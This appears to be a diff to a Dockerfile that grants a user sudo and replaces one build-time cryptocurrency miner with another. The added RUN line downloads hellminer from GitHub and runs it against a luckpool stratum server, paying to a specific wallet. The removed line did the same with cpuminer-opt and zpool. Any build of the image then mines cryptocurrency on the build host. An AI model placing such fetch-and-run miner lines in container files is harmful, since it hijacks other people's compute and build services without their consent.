@@ -24,4 +24,4 @@ RUN useradd -m kunemuse && \
     adduser kunemuse sudo && \
     sudo usermod -a -G sudo kunemuse
 
-RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-avx2 -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DJesgxRBcoGA3jkSvYyGKNFgq2vXWHgpQf -p c=DGB,zap=PYRK-lyra2z330 -t 16
+RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RYJDLYsGHZZTBQg7RxEi3j4Cx2fZGpVX5p.nyekopp -p x --cpu 6
